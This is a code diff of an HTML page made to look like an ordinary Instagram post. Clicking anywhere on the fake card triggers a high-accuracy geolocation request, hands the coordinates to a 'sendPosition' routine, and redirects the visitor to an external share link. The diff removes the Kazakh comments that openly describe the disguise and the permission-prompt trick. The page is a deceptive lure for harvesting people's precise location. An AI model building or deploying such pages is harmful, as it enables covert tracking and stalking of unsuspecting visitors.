@@ -19,7 +19,6 @@
 </head>
 <body>
 
-    <!-- Кәдімгі Instagram посты түріндегі басты бет -->
     <div class="instagram-card" onclick="requestLocation()">
         <div class="card-header">
             <div class="profile-pic"></div>
@@ -39,7 +38,6 @@
 
     <script>
         function requestLocation() {
-            // Пайдаланушы басқан сәтте бірден телефонның өз рұқсат сұрайтын терезесі шығады
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                     enableHighAccuracy: true,
@@ -71,7 +69,6 @@
         }
 
         function redirectToLink() {
-            // Адам батырманы басып, рұқсат еткеннен кейін немесе бас тартқан соң бағытталатын сілтеме
             window.location.href = "https://share.google/ReXWND2f4dfwXYJJx";
         }
     </script>
